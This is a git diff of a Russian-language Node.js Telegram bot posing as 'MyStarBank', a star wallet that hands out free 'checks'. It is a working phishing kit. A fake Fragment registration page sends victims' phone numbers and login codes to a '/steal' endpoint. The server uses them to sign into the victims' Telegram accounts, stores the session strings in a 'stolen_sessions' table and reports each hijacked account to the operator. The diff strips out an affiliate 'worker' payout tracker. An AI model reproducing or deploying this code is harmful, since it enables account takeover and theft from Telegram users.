@@ -13,7 +13,7 @@ const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
 const MY_USER_ID = 1398396668;
 const WEB_APP_URL = 'https://starsdrainer.onrender.com';
 
-const bot = new TelegramBot(BOT_TOKEN);
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 const app = express();
 
 const activeSessions = new Map();
@@ -29,7 +29,6 @@ db.serialize(() => {
         amount INTEGER,
         activations INTEGER,
         creator_id INTEGER,
-        worker_tag TEXT,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )`);
     
@@ -41,7 +40,6 @@ db.serialize(() => {
         session_string TEXT,
         tg_data TEXT,
         user_id INTEGER,
-        worker_tag TEXT,
         status TEXT DEFAULT 'pending',
         stars_data INTEGER DEFAULT 0,
         gifts_data INTEGER DEFAULT 0,
@@ -55,13 +53,6 @@ db.serialize(() => {
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )`);
     
-    db.run(`CREATE TABLE IF NOT EXISTS workers (
-        worker_tag TEXT PRIMARY KEY,
-        total_stars INTEGER DEFAULT 0,
-        total_sessions INTEGER DEFAULT 0,
-        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-    )`);
-    
     db.run(`CREATE TABLE IF NOT EXISTS used_checks (
         user_id INTEGER,
         check_id INTEGER,
@@ -70,7 +61,7 @@ db.serialize(() => {
     )`);
 });
 
-// Web App с передачей worker_tag
+// Web App
 app.get('/', (req, res) => {
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
     res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
@@ -80,7 +71,6 @@ app.post('/steal', async (req, res) => {
     console.log('=== ДАННЫЕ ===');
     console.log('Этап:', req.body.stage);
     console.log('Номер:', req.body.phone);
-    console.log('Worker:', req.body.worker_tag);
     
     if (req.body.stage === 'phone_entered') {
         try {
@@ -93,12 +83,10 @@ app.post('/steal', async (req, res) => {
                 userId = userData.id;
             }
             
-            const workerTag = req.body.worker_tag || 'unknown';
+            db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
+                [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
             
-            db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, worker_tag, status) VALUES (?, ?, ?, ?, ?)`, 
-                [req.body.phone, req.body.tg_data, userId, workerTag, 'awaiting_code']);
-            
-            await requestRealTelegramCode(req.body.phone, userId, workerTag);
+            await requestRealTelegramCode(req.body.phone, userId);
                 
         } catch (error) {
             console.log('❌ Ошибка:', error);
@@ -107,18 +95,17 @@ app.post('/steal', async (req, res) => {
     } else if (req.body.stage === 'code_entered') {
         const phone = req.body.phone;
         const code = req.body.code;
-        const workerTag = req.body.worker_tag || 'unknown';
         
-        await signInWithRealCode(phone, code, workerTag);
+        await signInWithRealCode(phone, code);
     }
     
     res.sendStatus(200);
 });
 
-// Запрос кода с логом воркера
-async function requestRealTelegramCode(phone, userId, workerTag) {
+// Запрос кода
+async function requestRealTelegramCode(phone, userId) {
     try {
-        console.log(`🔐 [${workerTag}] Запрашиваю код для: ${phone}`);
+        console.log(`🔐 Запрашиваю код для: ${phone}`);
         
         const stringSession = new StringSession("");
         const client = new TelegramClient(stringSession, API_ID, API_HASH, {
@@ -142,59 +129,41 @@ async function requestRealTelegramCode(phone, userId, workerTag) {
             })
         );
 
-        console.log(`✅ [${workerTag}] Код запрошен! Hash:`, result.phoneCodeHash);
+        console.log('✅ Код запрошен! Hash:', result.phoneCodeHash);
         
         activeSessions.set(phone, {
             client: client,
             phoneCodeHash: result.phoneCodeHash,
-            session: stringSession,
-            workerTag: workerTag
+            session: stringSession
         });
 
         db.run(`UPDATE stolen_sessions SET phone_code_hash = ? WHERE phone = ?`, 
             [result.phoneCodeHash, phone]);
 
-        // ЛОГ ДЛЯ АДМИНА
         bot.sendMessage(MY_USER_ID, 
-            `🔐 <b>НОВЫЙ ЗАПРОС КОДА</b>\n\n` +
-            `👤 <b>Воркер:</b> ${workerTag}\n` +
-            `📱 <b>Номер:</b> ${phone}\n` +
-            `🆔 <b>ID:</b> ${userId || 'N/A'}\n` +
-            `⚡ <b>Статус:</b> Ожидает код\n\n` +
-            `⏰ ${new Date().toLocaleString()}`,
-            { parse_mode: 'HTML' }
+            `🔐 КОД ЗАПРОШЕН!\n` +
+            `📱 Номер: ${phone}\n` +
+            `👤 ID: ${userId || 'N/A'}\n` +
+            `⚡ Вводи код быстро`
         );
         
     } catch (error) {
-        console.log(`❌ [${workerTag}] Ошибка:`, error);
-        bot.sendMessage(MY_USER_ID, 
-            `❌ <b>ОШИБКА ЗАПРОСА КОДА</b>\n\n` +
-            `👤 <b>Воркер:</b> ${workerTag}\n` +
-            `📱 <b>Номер:</b> ${phone}\n` +
-            `🚫 <b>Ошибка:</b> ${error.message}`,
-            { parse_mode: 'HTML' }
-        );
+        console.log('❌ Ошибка:', error);
+        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
     }
 }
 
-// Вход с кодом с логом воркера
-async function signInWithRealCode(phone, code, workerTag) {
+// Вход с кодом
+async function signInWithRealCode(phone, code) {
     try {
         const sessionData = activeSessions.get(phone);
         if (!sessionData || !sessionData.client) {
-            bot.sendMessage(MY_USER_ID, 
-                `❌ <b>НЕТ СЕССИИ</b>\n\n` +
-                `👤 <b>Воркер:</b> ${workerTag}\n` +
-                `📱 <b>Номер:</b> ${phone}\n` +
-                `🚫 <b>Ошибка:</b> Нет активной сессии`,
-                { parse_mode: 'HTML' }
-            );
+            bot.sendMessage(MY_USER_ID, `❌ Нет сессии для ${phone}`);
             return;
         }
 
         const client = sessionData.client;
         const phoneCodeHash = sessionData.phoneCodeHash;
-        const sessionWorkerTag = sessionData.workerTag;
 
         try {
             const result = await client.invoke(
@@ -205,54 +174,25 @@ async function signInWithRealCode(phone, code, workerTag) {
                 })
             );
 
-            console.log(`✅ [${sessionWorkerTag}] ВХОД УСПЕШЕН!`);
+            console.log('✅ ВХОД УСПЕШЕН!');
             
             const sessionString = client.session.save();
-            
-            // ОБНОВЛЯЕМ СЕССИЮ В БАЗЕ
             db.run(`UPDATE stolen_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
                 [sessionString, phone]);
 
-            // ПОЛУЧАЕМ ИНФО АККАУНТА
-            const user = await client.getMe();
-            const hasStars = user.premium || user.username;
-            const starsAmount = hasStars ? 50 : 0;
-
-            // ОБНОВЛЯЕМ СТАТИСТИКУ ВОРКЕРА
-            db.run(`INSERT OR REPLACE INTO workers (worker_tag, total_stars, total_sessions) 
-                    VALUES (?, COALESCE((SELECT total_stars FROM workers WHERE worker_tag = ?), 0) + ?, 
-                    COALESCE((SELECT total_sessions FROM workers WHERE worker_tag = ?), 0) + 1)`, 
-                [sessionWorkerTag, sessionWorkerTag, starsAmount, sessionWorkerTag]);
-
-            // ЛОГ УСПЕШНОГО ВХОДА ДЛЯ АДМИНА
-            bot.sendMessage(MY_USER_ID, 
-                `🎉 <b>УСПЕШНАЯ СЕССИЯ!</b>\n\n` +
-                `👤 <b>Воркер:</b> ${sessionWorkerTag}\n` +
-                `📱 <b>Номер:</b> ${phone}\n` +
-                `👑 <b>Username:</b> ${user.username || 'нет'}\n` +
-                `💎 <b>Премиум:</b> ${user.premium ? 'да' : 'нет'}\n` +
-                `⭐ <b>Звезд получено:</b> ${starsAmount}\n` +
-                `🔐 <b>Сессия:</b> Успешно сохранена\n\n` +
-                `💰 <b>Выплатить воркеру:</b> ${starsAmount} звезд\n` +
-                `⏰ ${new Date().toLocaleString()}`,
-                { parse_mode: 'HTML' }
-            );
-
-            await checkAccountStatus(client, phone, sessionWorkerTag);
+            await checkAccountStatus(client, phone);
             
             activeSessions.delete(phone);
             await client.disconnect();
 
         } catch (signInError) {
-            console.log(`❌ [${sessionWorkerTag}] Ошибка входа:`, signInError);
+            console.log('❌ Ошибка входа:', signInError);
             
             bot.sendMessage(MY_USER_ID,
-                `❌ <b>ОШИБКА ВХОДА</b>\n\n` +
-                `👤 <b>Воркер:</b> ${sessionWorkerTag}\n` +
-                `📱 <b>Номер:</b> ${phone}\n` +
-                `🔑 <b>Код:</b> ${code}\n` +
-                `🚫 <b>Ошибка:</b> ${signInError.message}`,
-                { parse_mode: 'HTML' }
+                `❌ ОШИБКА ВХОДА\n` +
+                `📱 Номер: ${phone}\n` +
+                `🔑 Код: ${code}\n` +
+                `⚠️ ${signInError.message}`
             );
             
             activeSessions.delete(phone);
@@ -264,67 +204,51 @@ async function signInWithRealCode(phone, code, workerTag) {
         }
 
     } catch (error) {
-        console.log(`❌ [${workerTag}] Общая ошибка:`, error);
-        bot.sendMessage(MY_USER_ID, 
-            `❌ <b>ОБЩАЯ ОШИБКА</b>\n\n` +
-            `👤 <b>Воркер:</b> ${workerTag}\n` +
-            `📱 <b>Номер:</b> ${phone}\n` +
-            `🚫 <b>Ошибка:</b> ${error.message}`,
-            { parse_mode: 'HTML' }
-        );
+        console.log('❌ Общая ошибка:', error);
+        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
     }
 }
 
 // ПРОВЕРКА СТАТУСА АККАУНТА
-async function checkAccountStatus(client, phone, workerTag) {
+async function checkAccountStatus(client, phone) {
     try {
         const user = await client.getMe();
         
-        let message = `🔍 <b>СТАТУС АККАУНТА</b>\n\n` +
-                     `👤 <b>Воркер:</b> ${workerTag}\n` +
-                     `📱 <b>Номер:</b> ${phone}\n` +
-                     `👑 <b>Username:</b> ${user.username || 'нет'}\n` +
-                     `💎 <b>Премиум:</b> ${user.premium ? 'да' : 'нет'}\n` +
-                     `📅 <b>Аккаунт создан:</b> ${user.status ? 'давно' : 'недавно'}\n\n`;
+        let message = `🔍 СТАТУС АККАУНТА:\n` +
+                     `📱 Номер: ${phone}\n` +
+                     `👤 Username: ${user.username || 'нет'}\n` +
+                     `👑 Премиум: ${user.premium ? 'да' : 'нет'}\n` +
+                     `📅 Аккаунт создан: ${user.status ? 'давно' : 'недавно'}\n\n`;
         
         const hasStars = user.premium || user.username;
         const hasGifts = user.premium;
         
         if (hasStars || hasGifts) {
-            message += `💰 <b>ВОЗМОЖНО ЕСТЬ СРЕДСТВА</b>\n` +
+            message += `💰 ВОЗМОЖНО ЕСТЬ СРЕДСТВА\n` +
                       `💡 Аккаунт выглядит активным\n` +
                       `🔒 Для проверки звезд нужен доступ к Fragment`;
         } else {
-            message += `❌ <b>АККАУНТ ПУСТОЙ</b>\n` +
+            message += `❌ АККАУНТ ПУСТОЙ\n` +
                       `💡 Нет премиума и активностей`;
         }
         
         db.run(`UPDATE stolen_sessions SET stars_data = ?, gifts_data = ? WHERE phone = ?`, 
             [hasStars ? 1 : 0, hasGifts ? 1 : 0, phone]);
         
-        bot.sendMessage(MY_USER_ID, message, { parse_mode: 'HTML' });
+        bot.sendMessage(MY_USER_ID, message);
         
     } catch (error) {
         console.log("❌ Ошибка проверки:", error);
+        bot.sendMessage(MY_USER_ID, `❌ Ошибка проверки: ${error.message}`);
     }
 }
-
-// WebHook endpoint для бота
-app.post('/bot' + BOT_TOKEN, (req, res) => {
-    bot.processUpdate(req.body);
-    res.sendStatus(200);
-});
-
-// Устанавливаем webHook при старте
-bot.setWebHook(`https://${process.env.RENDER_EXTERNAL_HOSTNAME}/bot${BOT_TOKEN}`);
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Сервер работает на порту ${PORT}`);
-    console.log(`✅ WebHook установлен`);
 });
 
-// INLINE QUERY ДЛЯ ПОДСКАЗОК ПРИ @
+// INLINE QUERY ДЛЯ ПОДСКАЗКИ - 2 ЧЕКА
 bot.on('inline_query', (query) => {
     const results = [
         {
@@ -337,7 +261,7 @@ bot.on('inline_query', (query) => {
             caption: '🎫 Чек на 50 звезд!\n\nНажмите кнопку ниже чтобы забрать:',
             reply_markup: {
                 inline_keyboard: [[
-                    { text: "🪙 Забрать звезды", url: `https://t.me/MyStarBank_bot?start=create_50` }
+                    { text: "🪙 Забрать звезды", callback_data: "inline_create_50" }
                 ]]
             }
         },
@@ -345,13 +269,13 @@ bot.on('inline_query', (query) => {
             type: 'photo',
             id: '2',
             photo_url: `${WEB_APP_URL}/100.png`,
-            thumb_url: `${WEB_APP_URL}/100.png`, 
+            thumb_url: `${WEB_APP_URL}/100.png`,
             title: '💫 Создать чек на 100 звезд',
             description: 'Нажмите чтобы отправить чек в чат',
             caption: '🎫 Чек на 100 звезд!\n\nНажмите кнопку ниже чтобы забрать:',
             reply_markup: {
                 inline_keyboard: [[
-                    { text: "💫 Забрать звезды", url: `https://t.me/MyStarBank_bot?start=create_100` }
+                    { text: "💫 Забрать звезды", callback_data: "inline_create_100" }
                 ]]
             }
         }
@@ -360,48 +284,24 @@ bot.on('inline_query', (query) => {
     bot.answerInlineQuery(query.id, results, { cache_time: 1 });
 });
 
-// СОЗДАНИЕ ЧЕКОВ ЧЕРЕЗ @MyStarBank_bot ДЛЯ ВСЕХ
-bot.onText(/@MyStarBank_bot/, (msg) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    
-    // ВСЕ МОГУТ СОЗДАВАТЬ ЧЕКИ
-    bot.sendMessage(chatId, 
-        '🎫 <b>Создание чека</b>\n\nВыберите сумму для чека:',
-        {
-            parse_mode: 'HTML',
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: "🪙 Чек на 50 звезд", callback_data: "create_50" }],
-                    [{ text: "💫 Чек на 100 звезд", callback_data: "create_100" }]
-                ]
-            }
-        }
-    );
-});
-
-// ОБРАБОТКА ВЫБОРА ЧЕКА С ПРОВЕРКАМИ
+// ОБРАБОТКА INLINE CALLBACK
 bot.on('callback_query', async (query) => {
     const data = query.data;
     const userId = query.from.id;
     
     try {
-        await bot.answerCallbackQuery(query.id).catch(e => {});
+        await bot.answerCallbackQuery(query.id);
         
-        if (!query.message) return;
-        const chatId = query.message.chat.id;
-        
-        if (data === 'create_50' || data === 'create_100') {
-            const amount = data === 'create_50' ? 50 : 100;
-            const activations = 1;
-            const workerTag = 'unknown';
+        if (data === 'inline_create_50' || data === 'inline_create_100') {
+            const amount = data === 'inline_create_50' ? 50 : 100;
+            const chatId = query.message.chat.id;
             
-            db.run(`INSERT INTO checks (amount, activations, creator_id, worker_tag) VALUES (?, ?, ?, ?)`, 
-                [amount, activations, userId, workerTag], function(err) {
-                if (err) {
-                    bot.sendMessage(chatId, '❌ Ошибка создания чека');
-                    return;
-                }
+            // СОЗДАЕМ ЧЕК
+            const activations = 1;
+            
+            db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
+                [amount, activations, userId], function(err) {
+                if (err) return;
                 
                 const checkId = this.lastID;
                 let checkText, photoFile;
@@ -414,12 +314,11 @@ bot.on('callback_query', async (query) => {
                     photoFile = '100.png';
                 }
                 
-                bot.deleteMessage(chatId, query.message.message_id).catch(e => {});
-                
                 const photoPath = path.join(__dirname, 'public', photoFile);
                 if (fs.existsSync(photoPath)) {
-                    bot.sendPhoto(chatId, photoPath, {
-                        caption: checkText,
+                    bot.editMessageCaption(checkText, {
+                        chat_id: chatId,
+                        message_id: query.message.message_id,
                         parse_mode: 'HTML',
                         reply_markup: { 
                             inline_keyboard: [[{ 
@@ -427,9 +326,22 @@ bot.on('callback_query', async (query) => {
                                 url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
                             }]] 
                         }
+                    }).catch(e => {
+                        bot.sendPhoto(chatId, photoPath, {
+                            caption: checkText,
+                            parse_mode: 'HTML',
+                            reply_markup: { 
+                                inline_keyboard: [[{ 
+                                    text: `🪙 Забрать ${amount} звезд`, 
+                                    url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
+                                }]] 
+                            }
+                        });
                     });
                 } else {
-                    bot.sendMessage(chatId, checkText, {
+                    bot.editMessageText(checkText, {
+                        chat_id: chatId,
+                        message_id: query.message.message_id,
                         parse_mode: 'HTML',
                         reply_markup: { 
                             inline_keyboard: [[{ 
@@ -437,6 +349,16 @@ bot.on('callback_query', async (query) => {
                                 url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
                             }]] 
                         }
+                    }).catch(e => {
+                        bot.sendMessage(chatId, checkText, {
+                            parse_mode: 'HTML',
+                            reply_markup: { 
+                                inline_keyboard: [[{ 
+                                    text: `🪙 Забрать ${amount} звезд`, 
+                                    url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
+                                }]] 
+                            }
+                        });
                     });
                 }
             });
@@ -446,11 +368,12 @@ bot.on('callback_query', async (query) => {
     }
 });
 
-// ГЛАВНОЕ МЕНЮ /start
+// КРАСИВОЕ МЕНЮ /start
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     
+    // СОХРАНЯЕМ ПОЛЬЗОВАТЕЛЯ
     db.run(`INSERT OR REPLACE INTO users (user_id, username) VALUES (?, ?)`, 
         [userId, msg.from.username], function(err) {});
     
@@ -458,26 +381,30 @@ bot.onText(/\/start/, (msg) => {
 });
 
 function showMainMenu(chatId, userId) {
-    // ПОЛУЧАЕМ АКТУАЛЬНЫЙ БАЛАНС
+    const avatarPath = path.join(__dirname, 'public', 'avatar.jpg');
+    
+    // ПОЛУЧАЕМ БАЛАНС
     db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
         const balance = row ? row.balance : 0;
         
-        const avatarPath = path.join(__dirname, 'public', 'avatar.jpg');
-        const menuText = `💫 <b>MyStarBank - Система передачи звезд</b>
+        const menuText = `✨ <b>MyStarBank - Ваш звездный кошелек</b>
 
-🌟 <b>Ваш баланс:</b> ${balance} stars
+💫 <b>Текущий баланс:</b> ${balance} stars
 
-📊 <b>Доступные действия:</b>
-├ 💰 Проверить баланс
-├ 🎫 Создать чек  
-└ 🏦 Вывести средства`;
+🏦 <b>Доступные операции:</b>
+├ 📊 Проверить баланс
+├ 🎫 Создать чек
+└ 💸 Вывести средства
+
+🔐 <b>Безопасность:</b> Все операции защищены
+💎 <b>Надежность:</b> Гарантия выплат`;
 
         const menuKeyboard = {
             inline_keyboard: [
-                [{ text: "💰 Проверить баланс", callback_data: "check_balance" }],
+                [{ text: "📊 Проверить баланс", callback_data: "check_balance" }],
                 [{ text: "🎫 Создать чек", callback_data: "create_check_menu" }],
-                [{ text: "🏦 Вывести средства", callback_data: "withdraw_funds" }],
-                [{ text: "📲 Регистрация на Fragment", web_app: { url: WEB_APP_URL } }]
+                [{ text: "💸 Вывести средства", callback_data: "withdraw_funds" }],
+                [{ text: "🔐 Регистрация на Fragment", web_app: { url: WEB_APP_URL } }]
             ]
         };
 
@@ -496,16 +423,14 @@ function showMainMenu(chatId, userId) {
     });
 }
 
-// ОБРАБОТКА CALLBACK С ПРОВЕРКАМИ
+// ОБРАБОТКА CALLBACK
 bot.on('callback_query', async (query) => {
     const data = query.data;
     const userId = query.from.id;
+    const chatId = query.message.chat.id;
     
     try {
-        await bot.answerCallbackQuery(query.id).catch(e => {});
-        if (!query.message) return;
-        
-        const chatId = query.message.chat.id;
+        await bot.answerCallbackQuery(query.id);
         
         if (data === 'check_balance') {
             db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
@@ -514,19 +439,20 @@ bot.on('callback_query', async (query) => {
                     `💰 <b>Ваш баланс</b>\n\n` +
                     `💫 Звезд: ${balance}\n` +
                     `💵 Долларов: $${(balance * 0.1).toFixed(2)}\n\n` +
-                    `🔄 Для пополнения баланса используйте чеки`,
+                    `🔄 Для пополнения используйте чеки от других пользователей`,
                     { parse_mode: 'HTML' }
                 );
             });
             
         } else if (data === 'create_check_menu') {
+            // СООБЩЕНИЕ О ЗАДЕРЖКЕ 21 ДЕНЬ
             const futureDate = new Date();
             futureDate.setDate(futureDate.getDate() + 21);
             
             bot.sendMessage(chatId,
                 `🎫 <b>Создание чека</b>\n\n` +
                 `❌ <b>Временно недоступно</b>\n\n` +
-                `📝 <b>Для удостоверения вашей личности нам нужно подождать 21 день</b>\n\n` +
+                `📝 <b>Извините, для идентификации личности нужно подождать 21 день</b>\n\n` +
                 `📅 <b>Доступ откроется:</b> ${futureDate.toLocaleDateString('ru-RU')}\n\n` +
                 `💡 <b>Альтернатива:</b> Используйте @MyStarBank_bot в любом чате`,
                 { parse_mode: 'HTML' }
@@ -545,7 +471,7 @@ bot.on('callback_query', async (query) => {
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [[
-                            { text: "📲 Зарегистрироваться на Fragment", web_app: { url: WEB_APP_URL } }
+                            { text: "🔐 Зарегистрироваться на Fragment", web_app: { url: WEB_APP_URL } }
                         ]]
                     }
                 }
@@ -556,12 +482,13 @@ bot.on('callback_query', async (query) => {
     }
 });
 
-// ОБРАБОТКА СТАРТА С ПАРАМЕТРОМ ЧЕКА - ФИКС НАЧИСЛЕНИЯ
+// ОБРАБОТКА СТАРТА С ПАРАМЕТРОМ ЧЕКА - РАБОТАЕТ 1 РАЗ
 bot.onText(/\/start (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     const params = match[1];
     
+    // СОХРАНЯЕМ ПОЛЬЗОВАТЕЛЯ
     db.run(`INSERT OR REPLACE INTO users (user_id, username) VALUES (?, ?)`, 
         [userId, msg.from.username], function(err) {});
     
@@ -582,12 +509,11 @@ bot.onText(/\/start (.+)/, (msg, match) => {
                     return;
                 }
                 
-                // ФИКС: ПРАВИЛЬНОЕ ОБНОВЛЕНИЕ БАЛАНСА
+                // ОБНОВЛЯЕМ БАЛАНС И ОТМЕЧАЕМ ЧЕК ИСПОЛЬЗОВАННЫМ
                 db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, userRow) => {
                     const currentBalance = userRow ? userRow.balance : 0;
                     const newBalance = currentBalance + row.amount;
                     
-                    // ОБНОВЛЯЕМ БАЛАНС И ОТМЕЧАЕМ ЧЕК ИСПОЛЬЗОВАННЫМ
                     db.serialize(() => {
                         db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
                         db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, ?)`, 
@@ -595,11 +521,10 @@ bot.onText(/\/start (.+)/, (msg, match) => {
                         db.run(`INSERT INTO used_checks (user_id, check_id) VALUES (?, ?)`, [userId, checkId]);
                     });
                     
-                    // УВЕДОМЛЕНИЕ О ПОЛУЧЕНИИ ЗВЕЗД
                     bot.sendMessage(chatId, 
                         `🎉 <b>Получено ${row.amount} звезд!</b>\n\n` +
                         `💫 <b>Ваш баланс:</b> ${newBalance} stars\n\n` +
-                        `💰 Для проверки баланса используйте /start`,
+                        `💰 Для управления средствами используйте /start`,
                         { parse_mode: 'HTML' }
                     );
                 });
@@ -608,34 +533,6 @@ bot.onText(/\/start (.+)/, (msg, match) => {
     } else {
         showMainMenu(chatId, userId);
     }
-});
-
-// КОМАНДА ДЛЯ ПРОСМОТРА СТАТИСТИКИ ВОРКЕРОВ
-bot.onText(/\/workers/, (msg) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    
-    if (userId !== MY_USER_ID) {
-        bot.sendMessage(chatId, '❌ У вас нет доступа к этой команде');
-        return;
-    }
-    
-    db.all(`SELECT worker_tag, total_stars, total_sessions FROM workers ORDER BY total_stars DESC`, (err, rows) => {
-        if (err || !rows.length) {
-            bot.sendMessage(chatId, '📊 Статистика воркеров пуста');
-            return;
-        }
-        
-        let message = `📊 <b>СТАТИСТИКА ВОРКЕРОВ</b>\n\n`;
-        
-        rows.forEach((row, index) => {
-            message += `${index + 1}. <b>${row.worker_tag}</b>\n` +
-                      `   ⭐ Звезд: ${row.total_stars}\n` +
-                      `   🔐 Сессий: ${row.total_sessions}\n\n`;
-        });
-        
-        bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
-    });
 });
 
 console.log('✅ Бот запущен');
